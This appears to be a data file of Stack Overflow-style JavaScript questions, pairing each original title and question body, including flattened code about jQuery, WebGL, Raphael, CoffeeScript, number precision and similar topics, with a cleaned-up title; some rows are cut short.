Javascript OO syntax.," There seem to be many different ways of doing OO in JavaScript.I like: and have never used features beyond what this provides (despite being a proficient OOer). I suspect this is old fashioned, because every so often I see new spangled variants, and it makes me wonder if I'm choosing the best approach. For instance, you can do magic in the constructor method to create private variables and accessor methods, something I believed (until relatively recently) to be impossible. What about subclassing? I wouldn't know how to achieve this, but it must have some sort of common pattern by now.How do you do it and why? <code>  function ClassA(){};ClassA.prototype={ someFunc:function(a,b,c){}, otherFunc:function(){}}var c=new ClassA();",Javascript OO syntax

How to capture mouse click with javascript when the mouse has moved between mousedown and mouseup," I am building a website with a scrolling Javascript time line, using code from this tutorial. There is a demo to go with the tutorial here.My problem is as follows: if the user clicks on the timeline to drag it, and they happen to click on a link, then when the mouse button is released, the browser interprets that as a click on the link. Hence, it's very easy to navigate away from the timeline by accident.The behaviour I would like is as follows: clicking on a link only triggers navigation if the mouse has not been moved between mousedown and mouseup. If the mouse has been moved while the button is held down, then the link is not followed, since the user is trying to move the timeline rather than click on a link.Is this possible? I have a feeling we need a is_mouse_moved boolean variable that is set to false on mousedown and set to true on mousemove. Then on mouseup we check whether to ""pass on"" the mouseup event to the browser. As you can tell, I'm not overly familiar with js!Any help appreciated. <code> ",How to capture mouse click with Javascript when the mouse has moved between mousedown and mouseup
What does sorting mean in double-byte languages?," I have some code that sorts table columns by object properties. It occurred to me that in Japanese or Chinese (non-alphabetical languages), the strings that are sent to the sort function would be compared the way an alphabetical language would. Take for example a list of Japanese surnames: When I sort the above list via Javascript, the result is: This is different from the ordering of the Japanese syllabary, which would arrange the list phonetically (the way a Japanese dictionary would): What I want to know is:Does one double-byte character really get compared against the other in a sort function?What really goes on in such a sort? (Extra credit) Does the result of such a sort mean anything at all? Does the concept of sorting really work in Asian (and other) languages? If so, what does it mean and what should one strive for in creating a compare function for those languages?ADDENDUM TO SUMMARIZE ANSWERS AND DRAW CONCLUSIONS:First, thanks to all who contributed to the discussion. This has been very informative and helpful. Special shout-outs to bobince, Lie Ryan, Gumbo, Jeffrey Zheng, and Larry K, for their in-depth and thoughtful analyses. I awarded the check mark to Larry K for pointing me toward a solution my question failed to foresee, but I up-ticked every answer I found useful.The consensus appears to be that:Chinese and Japanese character strings are sorted by Unicode code points, and their ordering may be predicated on a rationale that may be in some way intelligible to knowledgeable readers but is not likely to be of much practical value in helping users to find the information they're seeking.The kind of compare function that would be required to make a sort semantically or phonetically useful is far too cumbersome to consider pursuing, especially since the results would probably be less than satisfactory, and in any case the comparison algorithms would have to be changed for each language. Best just to allow the sort to proceed without even attempting a compare function.I was probably asking the wrong question here. That is, I was thinking too much ""inside the box"" without considering that the real question is not how do I make sorting useful in these languages, but how do I provide the user with a useful way of finding items in a list. Westerners automatically think of sorting for this purpose, and I was guilty of that. Larry K pointed me to a Wikipedia article that suggests a filtering function might be more useful for Asian readers. This is what I plan to pursue, as it's at least as fast as sorting, client-side. I will keep the column sorting because it's well understood in Western languages, and because speakers of any language would find the sorting of dates and other numerical-based data types useful. But I will also add that filtering mechanism, which would be useful in long lists for any language. <code>  (Suzuki) (Matsuzaka) (Matsui) (Yamada) (Fujimoto) (Suzuki) (Yamada) (Matsui) (Matsuzaka) (Fujimoto) (Suzuki) (Fujimoto) (Matsui) (Matsuzaka) (Yamada)","What does sorting mean in non-alphabetic (i.e, Asian) languages?"

Ternary Operator and Style," If you hate the ternary conditional operator in the first place, there's no need to reply ;)I usually see this used in tandem with an assignment expression like: However, I'd like to use it to replace simple code like: and instead do: I'm likely to be doing this in JavaScript. In the above it returns undefined so it doesn't require the assignment. I like the space saved but wonder what folks think on this type of use as, again, I usually only see ternary used with an assignment.EDIT: I've seen answers alluding to ""hiding intent"". Although classically used in expressions, how is this hiding the intent any more then using in an expression? Especially in a dynamic language where one may see the use of ternary operators all over the place? <code>  var foo = (some_condition) ? then_code : else_code; if(some_condition) { do_something_simple;} else { do_something_else;} (some_condition) ? do_something_simple : do_something_else;",Ternary (Conditional) Operator and Style

IEEE-754 Double (64-bit floating point) vs. Long (64-bit Integer) Revisited," I'm revisiting a question (How to test if numeric conversion will change value?) that as far as I was concerned was fully solved. The problem was to detect when a particular numeric value would overflow JavaScript's IEEE-754 Number type. The previous question was using C# and the marked answer worked perfectly.Now I'm doing the exact same task but this time in Java and it doesn't work. AFAIK, Java uses IEEE-754 for its double data type. So I should be able to cast it back and forth to force the loss of precision but it round trips. Baffled by this I started poking deeper in Java and now I'm really confused.In both C# and Java, the min and max values for long are the same: AFAIK, these values are outside the representable numbers in IEEE-754 because of the fixed bits reserved for the exponent and sign. This returns false for (value = -9223372036854775808L) in Java: This returns false for (value = -9223372036854775808L) in Java: This returns true for (value = -9223372036854775808L) but is less accurate: Why does this work this way? Am I missing something like compiler optimization, e.g. is the compiler detecting my conversions and ""fixing"" them for me?Edit: Adding test case by request. All three of these tests fail: <code>  long MIN_VALUE = -9223372036854775808L;long MAX_VALUE = 9223372036854775807L; // this fails in browsers that have stuck with the pure ECMAScript Number formatvar str = Number(-9223372036854775808).toFixed();if (""-9223372036854775808"" !== str) { throw new Error(""Overflow!""); } boolean invalidIEEE754(long value) { try { return ((long)((double)value)) != value; } catch (Exception ex) { return true; }} boolean invalidIEEE754(long value) { // trying to get closer to the actual representation and // being more explicit about conversions long bits = Double.doubleToLongBits(Long.valueOf(value).doubleValue()); long roundtrip = Double.valueOf(Double.longBitsToDouble(bits)).longValue(); return (value != roundtrip);} boolean invalidIEEE754(long value) { return (0x0L != (0xFFF0000000000000L & (value < 0L ? -value : value)));} import static org.junit.Assert.*;import org.junit.Test;public class FooTests { @Test public void ieee754One() { assertTrue(((long)((double)Long.MIN_VALUE)) != Long.MIN_VALUE); } @Test public void ieee754Two() { long bits = Double.doubleToLongBits(Long.valueOf(Long.MIN_VALUE).doubleValue()); long roundtrip = Double.valueOf(Double.longBitsToDouble(bits)).longValue(); assertTrue(Long.MIN_VALUE != roundtrip); } @Test public void ieee754Three() { long bits = Double.doubleToRawLongBits(Long.valueOf(Long.MIN_VALUE).doubleValue()); long roundtrip = Double.valueOf(Double.longBitsToDouble(bits)).longValue(); assertTrue(Long.MIN_VALUE != roundtrip); }}",IEEE-754 double (64-bit floating point) vs. long (64-bit integer) revisited

jQuery: How do you synchronously load a script from another directory via an ajax call?," I often need to load other javascript files via ajax, so at the beginning I used the standard function jQuery provides for script loading: But this didn't work out, since $.getScript is asynchronous (the jQuery API for $.ajax says 'async' is set to true by default; topic is discussed in the comments of the API for $.getScript: http://api.jquery.com/jQuery.getScript/). So I wrote this function, as provided by someone in the comments of the API page linked above: This seemed to work well, so I went on, but I recently noticed, that this only works for scripts in the same directory, eg. calling myObj.load('test.js') works well, but calling myObj.load('test/test.js') doesn't work at all.It feels like I'm missing something obvious, but I didn't manage to find the problem. Any idea? <code>  $.getScript('script_name.js',callback_function()); load:function(script,callback){ jQuery.ajax({ async:false, type:'GET', url:script, data:null, success:callback, dataType:'script' });},",How do you synchronously load a script from another directory via an ajax call?

Applying image filters to canvas image data or  in JavaScript," I'm a Flash developer, and I'm working on a JavaScript port of a game.

Is this asking too much of a browser?," I'm embedding a large array in <script> tags in my HTML, like this (nothing surprising): In this particular example, the array has 210,000 elements. That's well below the theoretical maximum of 231 - by 4 orders of magnitude. Here's the fun part: if I save JS source for the array to a file, that file is >44 megabytes (46,573,399 bytes, to be exact).If you want to see for yourself, you can download it from GitHub. (All the data in there is canned, so much of it is repeated. This will not be the case in production.)Now, I'm really not concerned about serving that much data. My server gzips its responses, so it really doesn't take all that long to get the data over the wire. However, there is a really nasty tendency for the page, once loaded, to crash the browser. I'm not testing at all in IE (this is an internal tool). My primary targets are Chrome 8 and Firefox 3.6.In Firefox, I can see a reasonably useful error in the console: Error: script stack space quota is exhaustedIn Chrome, I simply get the sad-tab page:Cut to the chase, alreadyIs this really too much data for our modern, ""high-performance"" browsers to handle?Is there anything I can do* to gracefully handle this much data?Incidentally, I was able to get this to work (read: not crash the tab) on-and-off in Chrome. I really thought that Chrome, at least, was made of tougher stuff, but apparently I was wrong...Edit 1@Crayon: I wasn't looking to justify why I'd like to dump this much data into the browser at once. Short version: either I solve this one (admittedly not-that-easy) problem, or I have to solve a whole slew of other problems. I'm opting for the simpler approach for now.@various: right now, I'm not especially looking for ways to actually reduce the number of elements in the array. I know I could implement Ajax paging or what-have-you, but that introduces its own set of problems for me in other regards.@Phrogz: each element looks something like this: @Will: but I have a computer with a 4-core processor, 6 gigabytes of RAM, over half a terabyte of disk space ...and I'm not even asking for the browser to do this quickly - I'm just asking for it to work at all! Edit 2Mission accomplished!With the spot-on suggestions from Juan as well as Guffa, I was able to get this to work! It would appear that the problem was just in parsing the source code, not actually working with it in memory.To summarize the comment quagmire on Juan's answer: I had to split up my big array into a series of smaller ones, and then Array#concat() them, but that wasn't enough. I also had to put them into separate var statements. Like this: To everyone who contributed to solving this: thank you. The first round is on me!*other than the obvious: sending less data to the browser <code>  <script> var largeArray = [/* lots of stuff in here */];</script> {dateTime:new Date(1296176400000), terminalId:'terminal999', 'General___BuildVersion':'10.05a_V110119_Beta', 'SSM___ExtId':26680, 'MD_CDMA_NETLOADER_NO_BCAST___Valid':'false', 'MD_CDMA_NETLOADER_NO_BCAST___PngAttempt':0} var arr0 = [...];var arr1 = [...];var arr2 = [...];/* ... */var bigArray = arr0.concat(arr1, arr2, ...);",Have I reached the limits of the size of objects JavaScript in my browser can handle?

"jQuery, preferred way of modifying elements that have yet to be created (besides events)"," There are a lot of questions about binding future manipulations to non-existent elements that all end up answered with live/delegate. I am wondering how to run an arbitrary callback (to add a class or trigger a plugin, for example) to all existing elements that match a selector and all future elements that match that same selector that are yet to be created.It seems that the main functionality of the livequery plugin made it into the core but the other part, attaching arbitrary callbacks got lost along the way somehow.Another common answer is event delegation but what if one doesn't have access to all of the vendor code that is creating the elements to have it trigger the events?Here is some real-world code: One approach would be to monitor when new nodes are added/removed and re-trigger our selectors. Thanks to @arnorhs we know about the DOMNodeInserted event, which I would ignore the cross-browser problems in the hope that those small IE patches could someday land upstream to jQuery or knowing the jQuery DOM functions could be wrapped.Even if we could ensure that the DOMNodeInserted fired cross-browser, however, it would be ridiculous to bind to it with multiple selectors. Hundreds of elements can be created at any time, and making potentially dozens of selector calls on each of those elements would crawl.My best idea so farWould it maybe be better to monitor DOMNodeInserted/Deleted and/or hook into jQuery's DOM manipulation routines to only set a flag that a ""re-init"" should happen? Then there could just be a timer that checks that flag every x seconds, only running all those selectors/callbacks when the DOM has actually changed.That could still be really bad if you were adding/removing elements in great numbers at a fast rate (like with animation or ____). Having to re-parse the DOM once for each saved selector every x seconds could be too intense if x is low, and the interface would appear sluggish if x is high.Any other novel solutions?I will add a bounty when it lets me. I have added a bounty for the most novel solution!Basically what I am getting at is a more aspect-oriented approach to manipulating the DOM. One that can allow that new elements are going to be created in the future, and they should be created with the initial document.ready modifications applied to them as well.JS has been able to do so much magic lately that I'm hoping it will be obvious. <code>  // with livequery$('input[type=text], input[type=password], textarea, .basic_form .block select, .order_form .form_item select, .order_form .form_item input') .livequery(function(){ $(this) .focus(function(){ $(this).addClass('active'); }) .blur(function(){ $(this).removeClass('active'); }) .addClass('text'); });// with live$('input[type=text], input[type=password], textarea, .basic_form .block select, .order_form .form_item select, .order_form .form_item input') .live('focus', function(){ $(this).addClass('active'); }) .live('blur', function(){ $(this).removeClass('active'); }); // now how to add the class to future elements? // (or apply another plugin or whatever arbitrary non-event thing)",Preferred way of modifying elements that have yet to be created (besides events)

Basic Django and Javascript Question," I am trying to add some basic dynamic functionality to a web page. How do I use JavaScript on the client side to access database information via django on the server side?I feel like it should be easy to have a JavaScript function on the webpage which calls a django view (or something) and the django view returns a value to the JavaScript function. I don't want the JavaScript itself to connect to the database, because that would seem to circumnavigate django (which, to me, seems incorrect). Further, I want to be able to do several database requests via JavaScript on a single page. An example would be a web page for creating an invoice. Every additional line of the invoice would require a new query to the database. Then, depending on the product added to the invoice, an additional query would be required to determine that product's price. What I'm getting at is multiple queries to the database within one page done dynamically.Basically, I want django to do the database searching and pass the information to JavaScript. <code> ",Make queries from Javascript to Django server

Is there an Android built-in browser developer guide ?

It's a lot frustrating, because you have to test everything on all versions of Android emulator and if app grows big, it's A LOT of work to test all the features in all versions. Everyone is excited about HTML5, I was too, but only to the point when I moved to doing the real thing. I realized that there is so many problems when dealing with different versions of Android behaving sometimes a lot differently.If anyone has some good resource to share, I would be very happy.

Google Goecoding -- parsing address_components that may return differently," I'm using Google Maps V3 api. I am submitting an address search to return the proper geocoded result including the address, name of establishment, and lat/lngs.My problem is that the response from the geocoder can be formatted differently.

Is there a known jquery library that can be used to handle these different responses to return a data set of the address components that can be used for a human-readable way?I will note that the response also returns a ""formatted_address"" type, which returns it like: ""Hampton Beach, NH 03842, USA"" OR ""Boston University, 1 University Rd, Boston, MA 02215-1407, USA"" As you can see, these too are pretty different.

Why inclose javascript file in a function?," I've been playing around with Node.js after having not used JavaScript for a long time.One thing I've noticed is that many of the sample files I've been looking at use the following convention: Is there a reason to enclose all the JavaScript in a file in a function like that, or is it just convention?

What is the difference between different wanys of Custom event handling in JavaScript," I came across the below posts about custom event handling in JavaScript.

Javascript by reference vs. by value," I'm looking for some good comprehensive reading material on when JavaScript passes something by value and when by reference and when modifying a passed item affects the value outside a function and when not. I'm also interested in when assigning to another variable is by reference vs. by value and whether that follows any different rules than passing as a function parameter.I've done a lot of searching and find lots of specific examples (many of them here on SO) from which I can start to piece together pieces of the real rules, but I haven't yet found a single, well written document that describes it all.Also, are there ways in the language to control whether something is passed by reference or by value?Here are some of the types of questions I want to understand. These are just examples - I'm actually looking to understand the rules the language goes by, not just the answers to specific examples. But, here are some examples: When are the contents of x, y and z changed outside the scope of f for all the different types? If I want to make a fully independent copy of an object (no references whatsoever), what's the best practice way to do that? <code>  function f(a,b,c) { a = 3; b.push(""foo""); c.first = false;}var x = 4;var y = [""eeny"", ""miny"", ""mo""];var z = {first: true};f(x,y,z); function f() { var a = [""1"", ""2"", ""3""]; var b = a[1]; a[1] = ""4""; // what is the value of b now for all possible data types that the array in ""a"" might hold?}function f() { var a = [{yellow: ""blue""}, {red: ""cyan""}, {green: ""magenta""}]; var b = a[1]; a[1].red = ""tan""; // what is the value of b now and why? b.red = ""black""; // did the value of a[1].red change when I assigned to b.red?}",JavaScript by reference vs. by value

CSS text-decoration with multiple values (jQuery)," The question is simple; using jQuery's css function, the computed style of a CSS attribute may be returned, but what if there are more than one style for that attribute being rendered? For example : The instruction $('#foo').css('text-decoration'); will return underline. Now if I change it to The instruction $('#bar').css('text-decoration'); will return line-through, alright.But the actual text is also underline! How can I return both? Do I need to search all ancestors if I want to know if some text is both underline and line-through? Sounds a bit painful, no?** Edit **Another problem arises whith this HTML where $('#e1').css('text-decoration'); returns none for some reason, while the text is clearly rendered with an underline.** Disclaimer **This question is not to debate how the UA renders an element, but if an element hierarchy applies a CSS or not. If one wants to understand text-decoration better, I suggest one would read about it. The question tries to focus on a more generalize matter. For example, it can also apply to this HTML where one could want to know if the element keyword is visible or not. With the code below, this is simply done with ** UPDATE **After all the answers and comments, here is, based on Brock Adams solution : Thank you, everyone, for your inputs. <code>  <div id=""foo"" style=""text-decoration:underline;"">Some underline text</div> <div id=""foo"" style=""text-decoration:underline;"">Some underline <span id=""bar"" style=""text-decoration:line-through;"">text</span></div> <span style=""text-decoration:underline;"">some <span id=""e1"" style=""font-weight:bold;"">text</span></span> <div style=""display:none;"">Some <span id=""keyword"" style=""text-decoration:underline;"">hidden</span> text</div> cssLookup($('#keyword'), 'display', 'none'); // -> true /** * Lookup the given node and node's parents for the given style value.

It has to remain as it is.EDIT: It seems that the issue Firefox has with this code is that the link does not have an onclick event and has the code referenced via the href, or otherwise NOT onclick (in the example here the code is on href, in my actual code the href is set to just '#', however the link somehow triggers other actions when clicked, don't ask me how, it's a weird flash integration with the plupload tool). VS The second example is solid and works in all browsers when the click() function is triggered, however I need the first of these two to work without changing the link dynamically or otherwise. Any clever ideas? <code>  <a href=""javascript:alert('!');"" id=""myHrefLink"">My HREF Link</a><script> document.getElementById(""myHrefLink"").click();</script> <a href=""javascript:alert('This works!');"">Click me dynamically</a> <a href=""#"" onclick=""alert('This works!');"">Click me dynamically</a>",How can I click an href link dynamically in firefox?

Using Javascript in WPF Browser Control from a ViewModel," I am using an MVVM pattern on WPF4, though I am new to both. I am looking for a good solution to using a WebBrowser control that can receive Javascript commands and communicate with the ViewModel. It needs the following:Ability to collect values from Javascript forms, and return them to the ViewModelUse Javascript to determine ReadyState beforeRunning Javascript commands (setting form values, use form values for logical steps, submit form) some which happen across multiple page loadsThe site being worked on is not under my control to edit or update.

Javascript scope issue or nodeJS/V8 bug?," I am implementing an application that uses websockets and a console accessed via Telnet. There is a communication between the connection established via websockets and the console. I am experiencing a weird issue:If I send a string constant to an established socket when something is entered in the console it works ok.If I send a string received from the console scope It seems to open a new socket (not sure) because in the debug log I see it and in the browser side (websockets) it alerts me of a new connection.If I send a local string (instead of the one received from the other scope) it's sent correctly.

jQuery click event - How to tell if event originated from mouse or enter key?," I have a usability concern on a web site of mine. I have a set of tabs, each containing a form. When you click on the tab link, it gives focus to the first textbox in the tab content body. Mouse-oriented people love this ""feature"". The problem is when keyboard-oriented users use the TAB key on their keyboard to go through the tabs. They hit enter on the tab they want to look at, the click event fires and the tab shows up, but focus is given to the textbox, adjusting their tab order completely. So when they hit tab again, they want to go to the next tab on the screen, but since focus was moved inside the form, they can't easily get to the next tab using the keyboard.So, inside the click event I need to determine if they actually clicked on it with a mouse button. Is this possible? My first attempt was this: But keyCode is always 0. The which property is also always 0.

Best method for passing Data from Java/JSF2 bean to Javascript/jQuery Components," I am having trouble nailing down the best method for passing data from a Java backing/managed bean to a jQuery/Javascript component such as Highcharts, so that my web app produces/displays data in a dynamic, real time way. I am pretty solid on my Java side of things but I have a pretty limited knowledge of JavaScript/jQuery which is obviously where I am falling down. So far as I have read, the best way is to Ajaxify a hidden field on my web app and pass a JSON object or string? in to it and then pass that value into my JS component. Firstly this seems a bit labour intensive as I would have an Ajax call to update the JSON data and then a setInterval call to re-read the data into the JS component? I was hoping that I could pass the data straight into the JS component...Either way could someone just firm up my knowledge and tell me a good tried and tested method, if different from above... Guides/Demo's would also be massively appreciated!!I also use Primeface's 2.2.1 if this will affect a suggested methodology? CheersAlly UPDATE:Code is below but I just want to describe what I am trying to achieve quickly: Effectively I am trying to implement a dynamic Highcharts chart, using a simple count++ function from my backing bean. Obviously further down the line I will be using a real-time feed to provide this data but at the moment I am just trying to get Highcharts to work based of changing information from my JSF backing bean. Here is my simple count function and conversion to JSON (I am not sure if the JSON method is really necessary since only 1 value(int) is being passed, but I would like to retain this method as I am sure I will be using more extensively on other parts of the web app): Highcharts External JS File, again its worth noting that I have maintained the series function at the bottom of the chart to build/populate the graph before I start appending values obtained from the JSF Beans: And the inline JS Function held on my XHTML page: This works: but when I try to pass my bean value: That doesnt work...Also I've been trying both remoteCommand and Poll to get the chart to work, neither of which I have been successful with: As I've said before Bhesh, your help is massively appreciated and anymore would be great!

Quickly apply attribute changes to ~3000 Raphael objects," UPDATED QUESTIONI've updated this to be a little more succinct..:In this fiddle: http://jsfiddle.net/pX2Xb/4/ I have some raphael code that draws 3000 circles to a page. It then attempts to animate all circles at once (changes fill colour) over 10 seconds, which results in a clunky visual animation. Change the number of circles to 20 to see a much smoother animation for comparison.My questions are (a) is it possible for me to make the update to the 3000 elements smoother and (b) if so, what does the code to do that look like? Some notes:I'm willing to take a small timing hit if there's some way to optimise around this, but, for example, I would like all circles to at least have updated in 1.5x whatever the animation time is set to. So, if animation is 10 seconds, all circles should have changed in 15.3000 elements is roughly my limit at the moment, so I'd be happy with it working for that :) In saying that, if a solution can effectively handle more than that, for a general case, that'd be really great.older details, in case it helpsI'm creating a large map of US counties, of which there are over 3000; I'm using this Wikipedia svg file to get the relevant SVG paths to create the map, and am rendering the map using RaphaelJs.Accordingly, I end up with over 3000 statements similar to the following: I'm also creating a Paper.set() object to hold all of these elements: Forgetting for a moment that the file actually generated here is quite large, I would very much appreciate suggestions of how I can apply changes to the volume of objects detailed above, that is both quick and reasonably ok CPU wise (possible a big ask). I'm definitely open to changing the structure of my code/objects, as long as I can individually change attributes of specific counties. For example, I would like to be able to apply a different colour to each path content in a second or two (for all 3000+).The challenge I'm facing is not how to apply the colour changes, animations, etc, but how to do this quickly and efficiently. Right now, my machine screams at me if I loop and apply changes over the 3000+ objects; as an alternative, I was using setTimeout to break the changes out into smaller chunks (maybe 10 at a go, with a 40 ms delay). Over 3000 items, this becomes quite slow, and still uses a lot of CPU.Thanks,oli <code>  var cc_02130 = rsr.path(""M 140.66674,.... 320.11635""); // county path cc_02130.attr({id: '02130',.. ..""marker-start"": 'none'}); // init attrs var myset = paper.set([cc_56039, cc_56040, cc_56041 ...])",Smoothly animate attribute changes to ~3000 Raphael objects at once

In order for the lat and lon to become available I have to call the webcam function after lat and lon have been retrieved. Here is the javascript I'm working with ( geolocation portion is from Lynda.com. I combined that with JpegCam ). I added lat and lon divs to hold the values. Then I call the webcam function now_go() which gets the lat and long using getElementById(). This works great as long as the user shares their location. If they don't, the now_go() function is not called. But if I call it any earlier, the lat and lon are not available even if the user has decided to share their location.

fb-like button causing horizontal scrolling on mobile device," I have a Facebook Like button implementation which is rendering fine in all browsers desktop and mobile. But the issues lies on low-res devices with resolution of 240x320. the Like button is causing the device to zoom into the page thus rendering horizontal scrolling. The buttons is rendering fine on devices with width >= 320px like the iPhone etc., but older android devices with width less than that are facing issues. The way I see it. The page loads fine, then makes a server call to Facebook and then returns with some parameter that breaks it all up. It is generating an <iframe>. I am trying to put width and overflow CSS parameters but none seem to work. I am initializing the Like button like this:  <code>  <div id=""fb-root""><!--Facebook begins--> <div class=""fb-like"" data-href=""<%=RedirectURL%>"" data-send=""false"" data-layout=""button_count"" width=""80"" data-show-faces=""false""></div> <!-- ends --></div> <script> window.fbAsyncInit = function () { FB.init({ appId: '328982000461228', status: true, cookie: true, xfbml: true }); FB.Event.subscribe('edge.create', function (response) { ntptEventTag('ev=Social&Action=Method Shared'); }); }; </script> <script type=""text/javascript"">",Facebook Like button causing horizontal scrolling on mobile device
Scripts being stripped with jquery .load," I don't think this question has been posed before, at least not in the way I need it answered. I'm using jQuery's .load function. I have a problem when loading just page fragments.When using something like: All of the scripts on loadTest.html load just fine. However, when loading page fragments like this: the scripts are stripped out prior to the DOM being updatedThis is clearly documented in http://api.jquery.com/load/ which says:Note: When calling .load() using a URL without a suffixed selector expression, the content is passed to .html() prior to scripts being removed. This executes the script blocks before they are discarded. If .load() is however called with a selector expression appended to the URL, the scripts are stripped out prior to the DOM being updated, which is why they are never executed. An example of both cases can be seen below: I understand that I could just externally load the script which can be used anywhere, but the thing is, I'm using a page-wide ajax system where everything is loaded dynamically. So I don't really feel like having every single javascript function that I'll ever write (100's at this point) in external files. Especially because some of these javascript functions are made from values loaded from a database which I can't account for in a .js file.Is there any workaround for the scripts being stripped out prior to the DOM being updated? Could I in some way manually load them in? Any tiny example would be helpful to me. <code>  $('#content').load('loadTest.html'); $('#content').load('loadTest.html #content');",Scripts being stripped with jQuery .load

Coffeescript/Javascript Mixins - Idiot Seeking Explanation," I have been reading up on Mixins using Coffeescript or just plain Javascript from the following sources:http://arcturo.github.com/library/coffeescript/03_classes.html (near the bottom)and http://javascriptweblog.wordpress.com/2011/05/31/a-fresh-look-at-javascript-mixins/And while I am able to compile the various examples, I have a major question that seems to be preventing me from making progress in comprehending them.I have no idea what in the world is going on. To start, I will explain the Coffeescript that is confusing me. A number of questions come up here. First of all, what are we accomplishing with the moduleKeywords variable? I'm not understanding what that is doing. Secondly, how does extended?.apply(@) work? What is really going on here? I can look at the JavaScript compilation and see the following code .. Can anyone shed some general light on this?From deeper down in The Little Book on Coffeescript, I see an implementation. Here is how I read this:create literal ORM. Declare method find accepting a parameter. Declare method 'create' accepting a parameter. Declare method 'extended', with sub-method 'include', with sub-method 'save'.This is where I get the most lost.The literal ORM has a method, extended, and then Module is implemented/extended by the 'class' User. So I take this to mean that User has the same shape as Module. That part makes sense so far, simplistic inheritance. But then I get lost on @extend ORM. @extend is a method on Module, but what is the extended method doing? When is it called? How is it implemented? <code>  moduleKeywords = ['extended', 'included'] class Module @extend: (obj) -> for key, value of obj when key not in moduleKeywords @[key] = value obj.extended?.apply(@) this @include: (obj) -> for key, value of obj when key not in moduleKeywords # Assign properties to the prototype @::[key] = value obj.included?.apply(@) this Module.extend = function(obj) { var key, value, _ref; for (key in obj) { value = obj[key]; if (__indexOf.call(moduleKeywords, key) < 0) { this[key] = value; } } if ((_ref = obj.extended) != null) { _ref.apply(this); } return this; }; ORM = find: (id) -> create: (attrs) -> extended: -> @include save: -> class User extends Module @extend ORM",How to better understand Coffeescript/JavaScript mixins?

Repeated textures are severely distorted when rotating camera," I originally asked this question on gamedev, but none of the answers helped to solve problem, and I still have no clue what is the real cause. I didn't see anything about re-posting questions across SE in FAQs, so I can only hope this is okay. Moreover, in the retrospect the question is probably more related to graphics programming in general than just game development. Edit 1 beginsThe behaviour of the original post applies only to Windows XP and Windows 7, browsers Firefox and Chrome. On Ubuntu, there is no such distortion, but instead the textures ""shake"" while the camera is being rotated. When the rotation is halted, the shaking stops, but the textures may not be in the completely correct position.Edit 1 endsEdit 3 beginsThe program has been tested on 4 different computers, and haven't worked as intended on any of them.Edit 3 endsI have a large voxel in WebGL which I want to cover with tiled texture each tile has the side length of 1 in the vertex space. In this test scenario the camera is pointing to the negative z direction and the sides of the voxel are in the x-y, x-z, y-z planes.Smaller voxels (i.e. fewer repeats) work quite well, but at around 2000 x and y repeats per face (ie voxel size 2000*2000*2000) the textures start to look really ugly. When the camera points perpendicularly to the face the textures look correct regardless of the size/amount of repeats, but for voxels of the size mentioned above any rotation of even a couple of degrees causes a visible problem. Increasing the voxel size increases the distortion. The inverse is also true: with small voxels the textures look correct regardless of camera rotation. It seems to me that there is no hard threshold value for the size but that the effect starts to increase gradually from zero when the voxel is increased in size from the approx 2000 per side.See http://imgur.com/a/spQIv for a visualization. The first image is how it should look like, but when the camera is rotated, the lines start to become distorted as in the second image. The effect gets worse by increasing the voxel size and by rotating the camera more. http://imgur.com/a/wRndy contains two additional images with more severe effect.The textures (one X per texture) are originally 512*512 px. The screenshots have not been scaled in any way.My first guess was float inaccuracies, but that's quite hard to believe since the object has only the dimensions of the order of 1000.My second guess was some kind of weird int/float rounding error, but since everything is always handled in floats, I don't see how this could happen.The third possibility I could think of is that this is just impossible and that textures should not be repeated that many times. However, this seems quite unlikely IMO. My guess (and hope) is that there is some kind of quite elementary problem.Any suggestions about what can cause or commonly does cause this kind of thing are well appreciated, because I seem to be having a very hard time trying to narrow down the source of this problem on my own.I'm using: and in the shader: I also performed some very elementary calculations: For 32-bit floats the maximum significand is around 8.4 million. For voxel side length 2000 (which I noticed was the level where the effect became visible), one could naively expect approximately 0.00025 of a float rounding error in the coordinates. Assuming each repeat takes around 100 pixels in screen, the error should be significantly less than 1 pixel, which is not the case. Unless my calculation above was done incorrectly, I therefore would nominate that Float32 is not to blame and that the reason must be somewhere else.The line texture is used only for visualizing the problem. The problem persists also with other (more natural) kinds of textures.Edit 2 begins Enabling or disabling antialiasing makes no visible difference Edit 2 ends <code>  gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.LINEAR);gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR_MIPMAP_NEAREST);gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.REPEAT);gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.REPEAT);gl.generateMipmap(gl.TEXTURE_2D); #ifdef GL_ESprecision highp float;#endif",Repeated textures are severely distorted/shaking when rotating camera
Javascript - Detect if any javascript function is running," I know it may sound very strange, but I need to know if there is any active/running javascript in the page.I am in situation in which I have to run my javascript/jquery code after everything on the page is rendered and all other scripts have finished.Is it possible to detect this?EDIT:Thank you all for the answers. Unfortunately, I was not able to find a solution, because I have no full control of what is going on the page. Even, I was able to put my javascript in the end of the page, I think it will not be solution again. The reason is that when the page is rendering a function is triggered, it calls other functions and they calls other and so on. As a result, some of the data is incorrect and that's why i need to run my code to correct it.I use setTimeout with 2 seconds to ensure that my code will be executed last, but this is ugly...

I mean by ""in the background"" as I watch the first few panels and in the meantime the remainder panels just lazy load silently.

Incorporation of YUI 3 in rails .," I was wondering if any effort has been made towards integration of YUI3 with rails asset pipeline. By integration, I don't just mean a couple of helpers for including the library but rather a complete integration of YUI module loader.I'll elaborate the idea in detail: Currently, developers developing modules using YUI rely on Ant tasks for concatenating the module components and wrapping them up with some associated metadata and generating target files ( and optionally minifying and running jslint).Also, when fetching the modules, the YUI loader calculates the module dependencies and generates a single file comprising of all the dependencies which havent been included already in the page. I was wondering if the whole functionality could be seamlessly integrated into the Asset pipeline of rails.  <code> ",Incorporation of YUI 3 in rails

